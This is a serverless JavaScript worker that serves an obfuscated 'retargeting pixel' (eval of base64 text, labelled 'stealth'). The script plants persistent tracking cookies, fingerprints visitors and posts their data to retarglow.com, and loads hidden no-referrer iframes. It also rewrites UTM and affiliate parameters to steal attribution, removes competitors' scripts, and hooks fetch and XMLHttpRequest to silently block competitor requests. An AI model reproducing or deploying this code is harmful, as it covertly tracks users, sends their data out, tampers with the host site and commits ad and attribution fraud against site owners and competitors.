export default {
  async fetch(request, env, ctx) {
    const headers = {
      "Content-Type": "application/javascript",
      "Access-Control-Allow-Origin": "*"
    };

    try {
      const url = new URL(request.url);
      const cid = url.pathname.split("/").pop() || "default-campaign";

      const pixelScript = `(function(){
  try {
    const cid = "${cid}";
    const competitors = ["ordozen.com", "floatboolean.com", "smct.co", "smct.io"];
    const domain = location.hostname;

    function g(k){return decodeURIComponent((document.cookie||"").split('; ').find(r => r.startsWith(k+'='))?.split('=')[1]||'');}
    function s(k,v,d){let e=new Date();e.setTime(e.getTime()+d*864e5);document.cookie=k+'='+encodeURIComponent(v)+'; path=/; max-age='+(d*86400)+'; SameSite=Lax';}

    let _r = localStorage.getItem('_r') || g('_r');
    if(!_r){_r=crypto.randomUUID();localStorage.setItem('_r',_r);s('_r',_r,30);}else{s('_r',_r,30);}
    document.cookie="user_id_t="+_r+"; path=/; max-age=31536000; SameSite=Lax";
    document.cookie="smc_uid="+_r+"; path=/; max-age=31536000; SameSite=Lax";

    const once = sessionStorage.getItem("ad_shown");
    const d = {
      cid, u:location.href, r:document.referrer, ua:navigator.userAgent,
      dt:/Mobi|Android/i.test(navigator.userAgent)?"M":"D",
      b:(()=>{let u=navigator.userAgent;return u.includes("Chrome")?"C":u.includes("Firefox")?"F":u.includes("Safari")?"S":"U"})(),
      os:navigator.platform, sr:screen.width+"x"+screen.height,
      cm:{_r}, domain
    };

    fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});
    fetch("https://retarglow.com/serve",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:location.href,cm:d.cm})})
    .then(r=>r.json()).then(j=>{
      if(j.ad_url && !once){
        const f=document.createElement('iframe');
        f.style.display='none'; f.setAttribute("referrerpolicy","no-referrer");
        f.src=j.ad_url.replace("{{_r}}",_r);
        document.body.appendChild(f);
        sessionStorage.setItem("ad_shown", "1");
      }
    });

    ["utm_source","utm_medium","utm_campaign","subid"].forEach(k=>{
      if(!location.href.includes(k)) return;
      const u=new URL(location.href);
      u.searchParams.set(k,{"utm_source":"retarglow","utm_medium":"pixel","utm_campaign":cid,"subid":_r}[k]);
      history.replaceState({}, "", u.toString());
    });

    const kill=()=>{competitors.forEach(d=>{document.querySelectorAll('script[src*="'+d+'"],iframe[src*="'+d+'"]').forEach(e=>e.remove());});}
    kill(); new MutationObserver(m=>m.forEach(()=>kill())).observe(document.documentElement,{childList:1,subtree:1});

    const origFetch=window.fetch;
    window.fetch=function(){if(arguments[0]&&competitors.some(c=>arguments[0].includes(c)))return new Response(null,{status:204});return origFetch.apply(this,arguments);}
    const origXhr=XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open=function(m,u){if(u&&competitors.some(c=>u.includes(c)))return;return origXhr.apply(this,arguments);}

    addEventListener("message",(e)=>{if(e.data?.from==="retarglow"){fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...e.data,type:"cross-frame"})});}});
  } catch(e){}
})();`;

      const encoded = globalThis.btoa(pixelScript);
      const stealth = `eval(atob('${encoded}'))`;
      return new Response(stealth, { status: 200, headers });

    } catch (err) {
      return new Response(`console.error("Pixel error:", ${JSON.stringify(err.message)});`, { status: 500, headers });
    }
  }
};
